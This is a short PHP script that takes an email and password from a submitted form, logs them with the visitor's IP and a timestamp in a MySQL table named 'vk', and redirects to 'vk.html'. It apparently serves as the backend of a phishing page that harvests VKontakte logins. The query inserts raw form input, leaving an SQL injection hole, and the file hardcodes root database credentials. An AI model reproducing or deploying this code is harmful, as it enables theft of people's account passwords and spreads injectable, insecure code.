<?php
	date_default_timezone_set('Europe/Kiev'); 
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	    $ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	
    $date = date('Y-m-d H:i:s');
	$email = $_POST['email'];
	$pass = $_POST['pass'];

	$conn = mysqli_connect('localhost', 'root', '0000', 'vk') or die(mysqli_error($conn));
	mysqli_set_charset($conn, "utf8");

	mysqli_query($conn, "INSERT INTO vk values(NULL, '$email', '$pass', '$ip', '$date')") or die(mysqli_error($conn));

	header('location: vk.html');
?>